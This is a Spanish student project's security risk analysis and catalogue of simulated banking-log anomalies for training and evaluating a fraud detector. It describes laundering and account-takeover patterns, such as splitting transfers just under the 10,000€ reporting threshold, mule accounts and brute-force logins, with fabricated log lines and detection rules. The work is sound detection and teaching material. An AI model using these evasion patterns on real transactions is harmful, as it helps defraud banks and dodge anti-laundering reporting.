| CK-02 | Seudonimización de IBANs en logs para cumplir RGPD (sustituir ES1234 por tokens internos) | A-01, A-02 | R10 |

### Controles organizativos

| ID | Control | Aplica a | Riesgos mitigados |
| --- | --- | --- | --- |
| CO-01 | Nadie sube directamente a `main`; toda integración vía Pull Request aprobada por el coordinador | Proceso | R03, R04 |
| CO-02 | Checklist de revisión de PR: ¿hay credenciales? ¿hay `verdad_oculta`? ¿hay `target/`? | Proceso | R03, R04 |
| CO-03 | Formación del equipo en OWASP Top 10 y OWASP API Security Top 10 | Equipo | R01, R02, R07, R09 |
| CO-04 | Documentar responsable por cada activo (A-01..A-10) con contacto de escalado | Proceso | General |

---

## Conclusión crítica

### Los tres riesgos bloqueantes

El análisis identifica tres riesgos que, si se materializan, **invalidan el proyecto por completo**:

1. **R11 — Endpoints sin autenticación (Prioridad 100):** En la versión 0.3, cualquier persona en la red puede leer todas las anomalías detectadas, subir logs falsos y destruir la integridad de la evaluación. Este riesgo existe **ahora mismo** y debe resolverse antes de desplegar el proyecto fuera del entorno local.

2. **R04 — Credenciales en repositorio (Prioridad 100):** Si la contraseña de la BD se sube al repo, cualquier persona con acceso puede vaciar o destruir `anomalias_detectadas`. En un proyecto real, esto sería un incidente con obligación de notificación al regulador en 72h (RGPD Art. 33).

3. **R03 — Verdad oculta en repositorio (Prioridad 75):** El fichero `verdad_oculta.csv` es el corazón de la evaluación. Si se sube, el ejercicio pierde todo su valor académico. Es prácticamente irreversible: aunque se borre del árbol, el historial de git lo conserva indefinidamente.

### Controles esenciales mínimos (no negociables)

Para que el proyecto sea aceptable desde el punto de vista de seguridad:

- `verdad_oculta*.csv` en `.gitignore` **antes del primer commit** de Juan Carlos
- Credenciales en variables de entorno en **todos** los entornos
- Spring Security activado con autenticación JWT en **todos** los endpoints del panel
- HTTPS habilitado en cualquier despliegue fuera del equipo local
- Actuator reducido a `health,info` en el perfil de producción

### Riesgos residuales aceptados

Incluso aplicando todos los controles, persisten riesgos residuales que se aceptan conscientemente:

- **R12 (Evasión adversarial):** Un atacante motivado que conozca las reglas del detector siempre puede ajustar su comportamiento. El catálogo ANO-001..054 asume que el atacante no conoce las reglas; en producción real esto no siempre sería cierto. Se acepta como limitación del diseño académico.
- **R16 (Gap temporal en logs):** Los logs sintéticos pueden tener vacíos temporales que el detector interprete como anomalías. Se acepta un recall imperfecto como parte inherente del ejercicio.
- **R14 (Dependencias vulnerables):** Spring Boot 3.2 tiene un ciclo de parches activo, pero nuevos CVEs pueden aparecer en cualquier momento. El control CD-03 mitiga pero no elimina este riesgo.

### Estrategia de resiliencia

El proyecto adopta una jerarquía de resiliencia de cuatro niveles:

1. **Prevenir** — controles CP-01..CP-10 evitan que los riesgos se materialicen
2. **Detectar** — controles CD-01..CD-05 identifican incidentes en tiempo real
3. **Responder** — controles CC-01..CC-03 limitan el daño una vez detectado el incidente
4. **Recuperar** — control CK-01 (backup cifrado) garantiza que siempre hay una versión limpia para restaurar

---

## Fuentes

| Código | Fuente | Aplicación en el proyecto |
| --- | --- | --- |
| F-01 | OWASP Top 10 2021 (A01 Broken Access Control, A03 Injection, A07 Identification Failures) | R01, R07, R09 |
| F-02 | OWASP API Security Top 10 2023 (API1 BOLA/IDOR, API4 Unrestricted Resource Consumption) | R01, R06 |
| F-03 | OWASP ASVS v4.0 (Chapter 4: Access Control, Chapter 8: Data Protection) | R01, R10, R15 |
| F-04 | OWASP REST Security Cheat Sheet | R02, R07, R17 |
| F-05 | Spring Security Reference — JWT Authentication, Method Security (`@PreAuthorize`) | R01, R08, R09, R11 |
| F-06 | Spring Boot Actuator Security Guide | R05 |
| F-07 | Ley 10/2010 de prevención del blanqueo de capitales y financiación del terrorismo | ANO-001..010, ANO-045..049, R03 |
| F-08 | Reglamento (UE) 2016/679 — RGPD, Art. 32 (medidas técnicas) y Art. 33 (notificación brechas 72h) | R10, R13 |
| F-09 | Esquema Nacional de Seguridad (ENS) — Dimensiones de seguridad y niveles de protección | Tarea 3 (matriz) |
| F-10 | NIST SP 800-61r2 — Computer Security Incident Handling Guide | CC-01..CC-03 |

---

## Apéndice A — Cómo se usa el catálogo en el proyecto

Este catálogo no es solo documentación: es el **contrato de trabajo**
entre los tres módulos del proyecto. Cada ANO-XXX es una anomalía que:

1. **Juan Carlos (generador)** inserta en `transacciones.log` o `sesiones.log`
   siguiendo exactamente el patrón descrito.
2. **Adrián (detector)** aplica la regla de detección de cada ANO-XXX
   para encontrarla entre cientos de miles de registros normales.
3. **Javi (panel)** muestra los resultados: qué ANO-IDs se detectaron,
   en qué cuenta, con qué severidad, y permite al auditor revisarlos.

### El flujo completo

```
Juan Carlos                   Adrián                        Javi
─────────────                 ──────────────────            ──────────────────────
generador/                    detector/                     panel/
  genera 100.000 filas          lee transacciones.log         recibe los resultados
  normales                      y sesiones.log                vía API REST

  intercala ~3.000 filas        aplica reglas ANO-001         muestra en dashboard:
  anómalas según el             hasta ANO-054                 - ID de anomalía
  catálogo (ANO-001..054)                                     - categoría
                                por cada hit escribe           - severidad
  guarda fichero oculto:        en anomalias_detectadas        - cuenta afectada
  verdad_oculta.csv             (tabla del schema.sql)        - timestamp
  (NO se sube al repo)                                        - estado revisada/pendiente
```

### El fichero de verdad oculta

Juan Carlos genera un fichero `verdad_oculta.csv` **solo para él y el profesor**.
Formato:

```
transaction_id,ano_id,descripcion_breve
uuid-1,ANO-001,Fraccionamiento cuenta ES1234 días 20-22 mayo
uuid-26,ANO-010,Microdeposit+transferencia cuenta ES1234
...
```

Con este fichero el profesor puede calcular la **precisión del detector**:
cuántas anomalías encontró Adrián de las que Juan Carlos ocultó.

### Cómo evaluar el detector

- **Verdadero positivo (TP):** anomalía en `verdad_oculta.csv` que el detector encontró
- **Falso negativo (FN):** anomalía en `verdad_oculta.csv` que el detector NO encontró
- **Falso positivo (FP):** alerta del detector sobre un registro que era normal
- **Precisión = TP / (TP + FP)** — evitar falsos positivos
- **Recall = TP / (TP + FN)** — no dejar escapar anomalías reales

### Qué implementa cada módulo a partir del catálogo

| Módulo | Qué hace con el catálogo |
| --- | --- |
| `/generador` | Por cada ANO-XXX, genera entre 5 y 50 registros anómalos según el patrón del log descrito |
| `/detector` | Implementa la **Regla de detección** de cada ANO-XXX como una query SQL o lógica Java |
| `/panel` | Muestra `tipo_anomalia` (el ANO-ID), `severidad`, `cuenta_id` y `revisada` de la tabla `anomalias_detectadas` |

### Cómo lo llevamos a cabo (plan de trabajo)

1. **Kike (coordinador):** ha definido este catálogo, el `schema.sql` y el `formato-logs.md`.
   Todo el equipo trabaja sobre estos contratos.

2. **Juan Carlos:** para cada una de las 54 anomalías del catálogo, escribe un método Java
   que inyecte entre 5 y 50 registros falsos siguiendo el patrón exacto de los campos.
   El resto (≥ 97%) son registros normales generados aleatoriamente.

3. **Adrián:** implementa las reglas de detección (queries SQL con ventanas temporales,
   JOINs entre tablas, y filtros por campos) y escribe en `anomalias_detectadas`.

4. **Javi:** su panel ya acepta logs por API REST (`POST /api/logs/batch`)
   y muestra alertas en tiempo real. Necesita adaptar el modelo `LogEvent`
   para consumir el formato bancario de `formato-logs.md` y mostrar el ANO-ID
   en la pantalla de auditoría.

---

## Apéndice B — Catálogo de anomalías simuladas en logs (ANO-001..054)

> Cada entrada indica: qué falla, qué categoría de riesgo es, la severidad
> y exactamente qué aparece en `transacciones.log` o `sesiones.log` cuando
> se simula. Los campos siguen el contrato definido en `formato-logs.md`.
> El fichero de verdad oculta (qué filas son anómalas) **no se sube al repo**.

### Índice rápido

| ID | Anomalía | Categoría | Severidad | Log |
| --- | --- | --- | --- | --- |
| ANO-001 | Fraccionamiento bajo umbral legal | Blanqueo | ALTA | transacciones |
| ANO-002 | Smurfing por múltiples destinos | Blanqueo | ALTA | transacciones |
| ANO-003 | Cuenta mula receptora | Blanqueo | ALTA | transacciones |
| ANO-004 | Tránsito rápido (recibe y reenvía < 1h) | Blanqueo | ALTA | transacciones |
| ANO-005 | Transferencias circulares A→B→C→A | Blanqueo | ALTA | transacciones |
| ANO-006 | Importes en número redondo repetidos | Blanqueo | MEDIA | transacciones |
| ANO-007 | Transferencia grande pre-cierre de cuenta | Blanqueo | ALTA | transacciones |
| ANO-008 | Nóminas fantasma sin empresa registrada | Blanqueo | MEDIA | transacciones |
| ANO-009 | Transferencias internacionales sin historial | Blanqueo | ALTA | transacciones |
| ANO-010 | Microdeposit + transferencia grande | Blanqueo | ALTA | transacciones |
| ANO-011 | Cuenta nueva con grandes importes | Cuenta mula | ALTA | transacciones |
| ANO-012 | Cuenta dormida activada | Cuenta mula | ALTA | transacciones |
| ANO-013 | Cuenta que solo transita, nunca gasta | Cuenta mula | MEDIA | transacciones |
| ANO-014 | Mismo DNI con múltiples cuentas y mismo patrón | Cuenta mula | ALTA | transacciones |
| ANO-015 | Login desde país nuevo | Autenticación | ALTA | sesiones |
| ANO-016 | Sesión en dos continentes en < 2h | Autenticación | CRÍTICA | sesiones |
| ANO-017 | Login nocturno desde dispositivo nuevo + transferencia | Autenticación | CRÍTICA | sesiones + transacciones |
| ANO-018 | Fuerza bruta exitosa | Autenticación | ALTA | sesiones |
| ANO-019 | Cambio de contraseña + transferencia < 5 min | Autenticación | CRÍTICA | sesiones + transacciones |
| ANO-020 | Cambio de datos de contacto + transferencia | Autenticación | ALTA | sesiones + transacciones |
| ANO-021 | Sesión simultánea desde dos IPs distintas | Autenticación | CRÍTICA | sesiones |
| ANO-022 | Login desde IP Tor o VPN | Autenticación | ALTA | sesiones |
| ANO-023 | Login desde IP de entidad financiera | Autenticación | MEDIA | sesiones |
| ANO-024 | Múltiples cuentas desde la misma IP en < 1h | Autenticación | ALTA | sesiones |
| ANO-025 | Más de 10 transacciones en 5 minutos | Velocidad | ALTA | transacciones |
| ANO-026 | Retiradas en cajeros geográficamente imposibles | Velocidad | CRÍTICA | transacciones |
| ANO-027 | Máximo diario en cajero 7 días consecutivos | Velocidad | MEDIA | transacciones |
| ANO-028 | Pagos simultáneos con misma tarjeta en físicos distintos | Velocidad | CRÍTICA | transacciones |
| ANO-029 | Ráfaga de pagos online en < 2 minutos | Velocidad | ALTA | transacciones |
| ANO-030 | Transferencias programadas canceladas y reprogramadas | Velocidad | MEDIA | transacciones |
| ANO-031 | Timestamp de operación anterior al login | Integridad logs | CRÍTICA | transacciones + sesiones |
| ANO-032 | Importe negativo o cero | Integridad logs | ALTA | transacciones |
| ANO-033 | Dos operaciones con el mismo transaction_id | Integridad logs | ALTA | transacciones |
| ANO-034 | Operación sin ip_origen | Integridad logs | MEDIA | transacciones |
| ANO-035 | Operación sin sesión de autenticación previa | Integridad logs | CRÍTICA | transacciones |
| ANO-036 | Gap temporal inexplicable en los logs | Integridad logs | ALTA | transacciones |
| ANO-037 | Eventos generados más rápido que lo humanamente posible | Integridad logs | ALTA | transacciones |
| ANO-038 | Divisa no habilitada para el cliente | Integridad logs | MEDIA | transacciones |
| ANO-039 | Importe con más de 2 decimales en EUR | Integridad logs | MEDIA | transacciones |
| ANO-040 | Concepto con SQL o scripts inyectados | Integridad logs | ALTA | transacciones |
| ANO-041 | Cambio de datos por teléfono + transferencia | Fraude externo | ALTA | sesiones + transacciones |
| ANO-042 | Primera transferencia a destino nuevo por importe alto | Fraude externo | ALTA | transacciones |
| ANO-043 | Operación desde dispositivo habitual no reconocida por cliente | Fraude externo | MEDIA | transacciones |
| ANO-044 | Nombre de beneficiario con typosquatting | Fraude externo | MEDIA | transacciones |
| ANO-045 | Supera 10.000€ sin generar alerta regulatoria | Normativa | CRÍTICA | transacciones |
| ANO-046 | Cliente en lista de sanciones operando | Normativa | CRÍTICA | transacciones |
| ANO-047 | Transferencia a país bajo embargo | Normativa | CRÍTICA | transacciones |
| ANO-048 | KYC desactualizado + operación de alto riesgo | Normativa | ALTA | transacciones |
| ANO-049 | Operativa no encaja con perfil de riesgo | Normativa | MEDIA | transacciones |
| ANO-050 | Empleado consulta cuentas sin operación activa | Insider threat | MEDIA | sesiones |
| ANO-051 | Empleado aprueba operaciones fuera de horario | Insider threat | ALTA | transacciones |
| ANO-052 | Empleado con pico repentino de aprobaciones | Insider threat | ALTA | transacciones |
| ANO-053 | Empleado accede masivamente antes de su baja | Insider threat | ALTA | sesiones |
| ANO-054 | Aprobaciones cruzadas entre dos empleados | Insider threat | ALTA | transacciones |

---

### CATEGORÍA A — Blanqueo y movimiento sospechoso

#### ANO-001 — Fraccionamiento bajo umbral legal (smurfing por importe)

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** El cliente fragmenta grandes importes en transferencias
justo por debajo de 10.000€ para evitar el reporte obligatorio de la
Ley 10/2010. Lo repite varios días seguidos.

**Patrón en logs:**
- `cuenta_origen` = mismo valor en todos los registros
- `importe` = entre 9.000 y 9.999 (nunca llega a 10.000)
- `tipo_operacion` = TRANSFERENCIA
- `timestamp` = días consecutivos, misma franja horaria
- `estado` = COMPLETADA

```
2026-05-20T09:14:22|uuid-1|ES1234|ES9001|9900.00|EUR|TRANSFERENCIA|85.1.2.3|WEB-Chrome|ES||sess-01|Pago proveedor|COMPLETADA
2026-05-21T10:31:05|uuid-2|ES1234|ES9002|9850.00|EUR|TRANSFERENCIA|85.1.2.3|WEB-Chrome|ES||sess-02|Alquiler|COMPLETADA
2026-05-22T11:02:44|uuid-3|ES1234|ES9003|9700.00|EUR|TRANSFERENCIA|85.1.2.3|WEB-Chrome|ES||sess-03|Factura|COMPLETADA
```

**Regla de detección:** misma `cuenta_origen`, ≥ 3 TRANSFERENCIAS en 7 días,
cada `importe` < 10.000, suma total > 9.000.

---

#### ANO-002 — Smurfing por múltiples destinos

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Un mismo origen transfiere a muchos destinos distintos en
pocas horas con importes similares. Distribuye el dinero para dificultar
el rastreo.

**Patrón en logs:**
- `cuenta_origen` = mismo valor
- `cuenta_destino` = valores distintos en cada registro
- `importe` = similar en todos (± 10%)
- `timestamp` = todos en el mismo día

```
2026-05-23T08:01:00|uuid-4|ES1234|ES8001|3000.00|EUR|TRANSFERENCIA|85.1.2.3|WEB-Chrome|ES||sess-04||COMPLETADA
2026-05-23T08:14:22|uuid-5|ES1234|ES8002|3000.00|EUR|TRANSFERENCIA|85.1.2.3|WEB-Chrome|ES||sess-04||COMPLETADA
2026-05-23T08:27:10|uuid-6|ES1234|ES8003|2950.00|EUR|TRANSFERENCIA|85.1.2.3|WEB-Chrome|ES||sess-04||COMPLETADA
...  (hasta 10 destinos distintos)
```

**Regla de detección:** misma `cuenta_origen`, ≥ 5 `cuenta_destino` únicos
en 24h con `importe` similar.

---

#### ANO-003 — Cuenta mula receptora

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Varios orígenes distintos transfieren al mismo destino en
pocas horas. La cuenta destino actúa como agregador de fondos ilícitos.

**Patrón en logs:**
- `cuenta_destino` = mismo valor en todos los registros
- `cuenta_origen` = valores distintos
- `timestamp` = todos en ventana de pocas horas

```
2026-05-23T10:00:00|uuid-7|ES5001|ES9999|5000.00|EUR|TRANSFERENCIA|...|COMPLETADA
2026-05-23T10:12:30|uuid-8|ES5002|ES9999|4800.00|EUR|TRANSFERENCIA|...|COMPLETADA
2026-05-23T10:45:00|uuid-9|ES5003|ES9999|5200.00|EUR|TRANSFERENCIA|...|COMPLETADA
```

**Regla de detección:** misma `cuenta_destino`, ≥ 5 `cuenta_origen` únicos en 6h.

---

#### ANO-004 — Tránsito rápido (recibe y reenvía en menos de 1 hora)

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Una cuenta recibe un importe alto y en menos de una hora
lo transfiere íntegro. El dinero pasa pero no se queda, típico de mula.

**Patrón en logs:**
- Registro 1: `cuenta_destino` = ES9999, `importe` alto, `tipo_operacion` = TRANSFERENCIA
- Registro 2: `cuenta_origen` = ES9999, `importe` similar, `tipo_operacion` = TRANSFERENCIA
- Diferencia de `timestamp` entre ambos < 60 minutos

```
2026-05-23T11:00:00|uuid-10|ES5001|ES9999|48000.00|EUR|TRANSFERENCIA|...|COMPLETADA
2026-05-23T11:47:33|uuid-11|ES9999|ES7777|47500.00|EUR|TRANSFERENCIA|...|COMPLETADA
```

**Regla de detección:** misma cuenta como `cuenta_destino` y luego como
`cuenta_origen` en < 60 min con `importe` > 10.000.

---

#### ANO-005 — Transferencias circulares (A → B → C → A)

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** El dinero recorre un ciclo entre cuentas para simular
actividad legítima y dificultar el rastreo del origen real.

**Patrón en logs:**
- Tres o más registros donde el `cuenta_destino` de uno es el `cuenta_origen` del siguiente
- El último `cuenta_destino` coincide con el primer `cuenta_origen`

```
2026-05-23T09:00:00|uuid-12|ES-A|ES-B|10000.00|EUR|TRANSFERENCIA|...|COMPLETADA
2026-05-23T09:30:00|uuid-13|ES-B|ES-C|9900.00|EUR|TRANSFERENCIA|...|COMPLETADA
2026-05-23T10:00:00|uuid-14|ES-C|ES-A|9800.00|EUR|TRANSFERENCIA|...|COMPLETADA
```

**Regla de detección:** grafo dirigido entre cuentas; alertar si existe ciclo
en menos de 24h.

---

#### ANO-006 — Importes en número redondo repetidos

**Severidad:** MEDIA | **Log:** `transacciones.log`

**Qué falla:** Las transacciones reales raramente son importes exactamente
redondos. Repetirlos indica automatización o acuerdo previo.

**Patrón en logs:**
- `importe` = múltiplo exacto de 1000 (sin decimales significativos)
- Mismo `importe` repetido en múltiples registros del mismo `cuenta_origen`

```
2026-05-20T10:00:00|uuid-15|ES1234|ES0001|5000.00|EUR|TRANSFERENCIA|...|COMPLETADA
2026-05-21T10:00:00|uuid-16|ES1234|ES0002|5000.00|EUR|TRANSFERENCIA|...|COMPLETADA
2026-05-22T10:00:00|uuid-17|ES1234|ES0003|5000.00|EUR|TRANSFERENCIA|...|COMPLETADA
```

**Regla de detección:** misma `cuenta_origen`, ≥ 3 veces el mismo `importe`
redondo en 7 días.

---

#### ANO-007 — Transferencia grande justo antes del cierre de cuenta

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** El titular vacía la cuenta con una transferencia grande
antes de cerrarla. Patrón de huida o vaciado previo a embargo.

**Patrón en logs:**
- Registro con `tipo_operacion` = TRANSFERENCIA e `importe` alto
- Seguido en < 48h de `tipo_operacion` = CIERRE_CUENTA con el mismo `cuenta_origen`

```
2026-05-22T14:00:00|uuid-18|ES1234|ES9999|45000.00|EUR|TRANSFERENCIA|...|COMPLETADA
2026-05-23T09:00:00|uuid-19|ES1234||0.00|EUR|CIERRE_CUENTA|...|COMPLETADA
```

**Regla de detección:** CIERRE_CUENTA precedido en < 48h de TRANSFERENCIA
con `importe` > 10.000 en la misma `cuenta_origen`.

---

#### ANO-008 — Nóminas fantasma sin empresa registrada

**Severidad:** MEDIA | **Log:** `transacciones.log`

**Qué falla:** Una cuenta sin categoría de empresa realiza transferencias
de importe idéntico a distintos destinatarios cada mes, simulando nóminas.

**Patrón en logs:**
- `cuenta_origen` = cuenta de persona física (no empresa)
- `importe` = idéntico en todos los registros
- `concepto` = contiene "nómina" o "salario"
- `timestamp` = mismo día del mes en meses consecutivos

```
2026-04-28T09:00:00|uuid-20|ES1234|ES2001|1800.00|EUR|TRANSFERENCIA|...|Nómina abril|COMPLETADA
2026-04-28T09:01:00|uuid-21|ES1234|ES2002|1800.00|EUR|TRANSFERENCIA|...|Nómina abril|COMPLETADA
2026-05-28T09:00:00|uuid-22|ES1234|ES2001|1800.00|EUR|TRANSFERENCIA|...|Nómina mayo|COMPLETADA
```

**Regla de detección:** misma `cuenta_origen` no empresarial, mismo `importe`
exacto a ≥ 3 destinatarios en el mismo día de mes durante ≥ 2 meses.

---

#### ANO-009 — Transferencias internacionales sin historial previo

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Un cliente que nunca ha operado internacionalmente envía
dinero a 5 países distintos en una semana sin explicación de viaje.

**Patrón en logs:**
- `pais_destino` = valores distintos y distintos de ES
- `cuenta_origen` = misma cuenta
- Historial previo (últimos 6 meses): todos los `pais_destino` eran vacíos o ES

```
2026-05-20T10:00:00|uuid-23|ES1234|XX-001|3000.00|EUR|TRANSFERENCIA|...|ES|RO|sess-05||COMPLETADA
2026-05-21T10:00:00|uuid-24|ES1234|XX-002|2500.00|EUR|TRANSFERENCIA|...|ES|NG|sess-06||COMPLETADA
2026-05-22T10:00:00|uuid-25|ES1234|XX-003|2000.00|EUR|TRANSFERENCIA|...|ES|UA|sess-07||COMPLETADA
```

**Regla de detección:** misma `cuenta_origen` con 0 registros de `pais_destino`
distinto de ES en 6 meses, y ≥ 3 países distintos en 7 días.

---

#### ANO-010 — Microdeposit seguido de transferencia grande

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** El atacante envía un depósito mínimo (0,01€) para verificar
que la cuenta destino está activa, luego realiza la transferencia real grande.

**Patrón en logs:**
- Registro 1: `importe` = 0.01, `tipo_operacion` = TRANSFERENCIA
- Registro 2: mismo `cuenta_destino`, `importe` > 1.000, en < 24h

```
2026-05-23T08:00:00|uuid-26|ES1234|ES9999|0.01|EUR|TRANSFERENCIA|...|COMPLETADA
2026-05-23T08:45:00|uuid-27|ES1234|ES9999|15000.00|EUR|TRANSFERENCIA|...|COMPLETADA
```

**Regla de detección:** misma `cuenta_origen` y `cuenta_destino`, primer
registro con `importe` < 0.10 seguido de `importe` > 1.000 en < 24h.

---

### CATEGORÍA B — Cuentas mula

#### ANO-011 — Cuenta nueva con grandes importes

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Una cuenta abierta hace menos de 30 días recibe o envía
más de 20.000€. No es coherente con el perfil de una cuenta recién creada.

**Patrón en logs:**
- `cuenta_destino` o `cuenta_origen` con `fecha_apertura` < 30 días
- `importe` > 20.000

```
2026-05-25T10:00:00|uuid-28|ES5000|ES-NUEVA|25000.00|EUR|TRANSFERENCIA|...|COMPLETADA
(ES-NUEVA tiene fecha_apertura = 2026-05-10, hace 15 días)
```

**Regla de detección:** cruzar `cuenta_destino` con tabla `cuentas`;
si `fecha_apertura` < NOW() - 30 días y `importe` > 20.000, alertar.

---

#### ANO-012 — Cuenta dormida que se activa bruscamente

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Una cuenta sin ningún movimiento durante más de 90 días
se activa de repente con una operación de importe alto.

**Patrón en logs:**
- `cuenta_origen` o `cuenta_destino` sin registros en los últimos 90 días
- Nuevo registro con `importe` > 5.000

```
(Último registro de ES6666: 2026-01-15)
2026-05-23T10:00:00|uuid-29|ES9999|ES6666|18000.00|EUR|TRANSFERENCIA|...|COMPLETADA
```

**Regla de detección:** gap de inactividad > 90 días en `cuenta_destino`
seguido de `importe` > 5.000.

---

#### ANO-013 — Cuenta que solo transita, nunca gasta en comercios

**Severidad:** MEDIA | **Log:** `transacciones.log`

**Qué falla:** Una cuenta real tiene diversidad de operaciones (compras,
cajeros, transferencias). Una cuenta mula solo recibe y reenvía.

**Patrón en logs:**
- Todos los registros de `cuenta_origen` tienen `tipo_operacion` = TRANSFERENCIA
- Ningún registro con PAGO_COMERCIO, PAGO_ONLINE o RETIRO_CAJERO

```
(100 registros de ES7777, todos tipo=TRANSFERENCIA, ningún PAGO ni RETIRO)
```

**Regla de detección:** cuenta con > 20 operaciones donde el 100% son
TRANSFERENCIA, sin ningún PAGO ni RETIRO en 90 días.

---

#### ANO-014 — Mismo DNI con múltiples cuentas y mismo patrón

**Severidad:** ALTA | **Log:** `transacciones.log`

**Qué falla:** Un titular tiene varias cuentas y todas replican el mismo
patrón de movimientos sospechosos, coordinadas.

**Patrón en logs:**
- Varias `cuenta_origen` vinculadas al mismo `dni` en tabla `clientes`
- Todas con el mismo patrón de `importe` y `tipo_operacion` en las mismas fechas

```
2026-05-23T10:00:00|uuid-30|ES-C1|ES9999|5000.00|EUR|TRANSFERENCIA|...|COMPLETADA
2026-05-23T10:05:00|uuid-31|ES-C2|ES9999|5000.00|EUR|TRANSFERENCIA|...|COMPLETADA
(ES-C1 y ES-C2 tienen el mismo titular por DNI)
```

**Regla de detección:** agrupar cuentas por `cliente_id`; si ≥ 2 cuentas
del mismo titular replican el mismo patrón en < 30 min, alertar.

---

### CATEGORÍA C — Accesos y autenticación sospechosos

#### ANO-015 — Login desde país donde el cliente nunca ha operado

**Severidad:** ALTA | **Log:** `sesiones.log`

**Qué falla:** El cliente accede desde un país en el que no tiene historial.
Puede indicar credenciales robadas usadas desde el exterior.

**Patrón en logs:**
- `tipo_evento` = LOGIN_OK
- `ip` con geolocalización en país X
- Historial previo (6 meses): todos los LOGIN_OK con `ip` geolocalizadas en ES

```
(sesiones.log)
sess-99|C001|2026-05-23T03:00:00|LOGIN_OK|196.45.12.3|WEB-Chrome
(IP 196.45.12.3 geolocalizada en NG — Nigeria; cliente sin historial fuera de ES)
```

**Regla de detección:** LOGIN_OK con geolocalización de `ip` en país sin
historial previo del `cliente_id`.

---

#### ANO-016 — Sesión en dos continentes en menos de 2 horas

**Severidad:** CRÍTICA | **Log:** `sesiones.log`

**Qué falla:** Físicamente imposible estar en España y en otro continente
con menos de 2 horas de diferencia. Indica sesión robada o token compartido.

**Patrón en logs:**
- `tipo_evento` = LOGIN_OK del mismo `cliente_id` en dos registros
- `ip` del primero geolocalizada en ES; `ip` del segundo en continente distinto
- Diferencia de `timestamp` < 120 minutos

```
sess-10|C001|2026-05-23T10:00:00|LOGIN_OK|85.1.2.3|WEB-Chrome   (ES)
sess-11|C001|2026-05-23T11:30:00|LOGIN_OK|177.80.5.6|MOB-Android (BR)
```

**Regla de detección:** dos LOGIN_OK del mismo `cliente_id` con
geolocalizaciones en continentes distintos en < 120 min.

---

#### ANO-017 — Login nocturno desde dispositivo nuevo seguido de transferencia

**Severidad:** CRÍTICA | **Log:** `sesiones.log` + `transacciones.log`

**Qué falla:** Patrón clásico de cuenta robada: el atacante entra de
madrugada desde un dispositivo que el cliente nunca ha usado y transfiere
antes de que el titular se despierte.

**Patrón en logs:**
- `sesiones.log`: LOGIN_OK con `timestamp` entre 01:00 y 05:00 y `dispositivo_id` nuevo
- `transacciones.log`: TRANSFERENCIA con mismo `sesion_id` en < 10 min

```
sess-12|C001|2026-05-23T03:14:00|LOGIN_OK|91.200.100.1|MOB-iPhone-NUEVO
uuid-32|2026-05-23T03:20:00|ES1234|ES9999|12000.00|EUR|TRANSFERENCIA|91.200.100.1|MOB-iPhone-NUEVO|ES||sess-12||COMPLETADA
```

**Regla de detección:** LOGIN_OK con hora < 05:00 y `dispositivo_id` sin
historial previo, seguido de TRANSFERENCIA > 5.000 en la misma sesión en < 10 min.

---

#### ANO-018 — Fuerza bruta exitosa

**Severidad:** ALTA | **Log:** `sesiones.log`

**Qué falla:** Varios intentos fallidos de contraseña para el mismo cliente
seguidos de un login exitoso. El atacante probó contraseñas hasta acertar.

**Patrón en logs:**
- N registros consecutivos de `tipo_evento` = LOGIN_FALLIDO para el mismo `cliente_id`
- Seguidos de `tipo_evento` = LOGIN_OK del mismo `cliente_id` y misma `ip`

```
sess-null|C001|2026-05-23T02:10:00|LOGIN_FALLIDO|91.200.100.1|WEB-Chrome
sess-null|C001|2026-05-23T02:10:05|LOGIN_FALLIDO|91.200.100.1|WEB-Chrome
sess-null|C001|2026-05-23T02:10:10|LOGIN_FALLIDO|91.200.100.1|WEB-Chrome
sess-13|C001|2026-05-23T02:10:15|LOGIN_OK|91.200.100.1|WEB-Chrome
```

**Regla de detección:** ≥ 5 LOGIN_FALLIDO del mismo `cliente_id` en < 5 min
seguidos de LOGIN_OK.

---

#### ANO-019 — Cambio de contraseña + transferencia en menos de 5 minutos

**Severidad:** CRÍTICA | **Log:** `sesiones.log` + `transacciones.log`

**Qué falla:** El atacante que toma control de una cuenta cambia la contraseña
para expulsar al titular y actúa inmediatamente con una transferencia.

**Patrón en logs:**
- `sesiones.log`: CAMBIO_PASSWORD del `cliente_id`
- `transacciones.log`: TRANSFERENCIA > umbral en < 5 min con mismo `sesion_id`

```
sess-14|C001|2026-05-23T14:00:00|CAMBIO_PASSWORD|91.200.100.1|WEB-Chrome
uuid-33|2026-05-23T14:03:00|ES1234|ES9999|20000.00|EUR|TRANSFERENCIA|...|sess-14||COMPLETADA
```

**Regla de detección:** CAMBIO_PASSWORD seguido de TRANSFERENCIA > 5.000
en la misma `sesion_id` en < 5 min.

---

#### ANO-020 — Cambio de datos de contacto + transferencia

**Severidad:** ALTA | **Log:** `sesiones.log` + `transacciones.log`

**Qué falla:** El atacante cambia el email o teléfono del titular para que
las alertas del banco no lleguen al dueño real, luego hace la transferencia.

**Patrón en logs:**
- `sesiones.log`: CAMBIO_CONTACTO del `cliente_id`
- `transacciones.log`: TRANSFERENCIA > umbral en < 24h

```
sess-15|C001|2026-05-23T10:00:00|CAMBIO_CONTACTO|85.1.2.3|WEB-Chrome
uuid-34|2026-05-23T10:30:00|ES1234|ES9999|8000.00|EUR|TRANSFERENCIA|...|sess-15||COMPLETADA
```

**Regla de detección:** CAMBIO_CONTACTO seguido de TRANSFERENCIA > 5.000
en < 24h del mismo `cliente_id`.

---

#### ANO-021 — Sesión simultánea desde dos IPs distintas

**Severidad:** CRÍTICA | **Log:** `sesiones.log`

**Qué falla:** La misma `sesion_id` aparece activa desde dos IPs
diferentes al mismo tiempo. El token de sesión fue robado y usado en paralelo.

**Patrón en logs:**
- Mismo `sesion_id` en dos registros simultáneos con `ip` distintas

```
sess-16|C001|2026-05-23T10:00:00|CONSULTA_SALDO|85.1.2.3|WEB-Chrome
sess-16|C001|2026-05-23T10:00:02|CONSULTA_SALDO|91.200.100.1|WEB-Firefox
```

**Regla de detección:** misma `sesion_id` con `ip` distintas en registros
con diferencia de `timestamp` < 30 segundos.

---

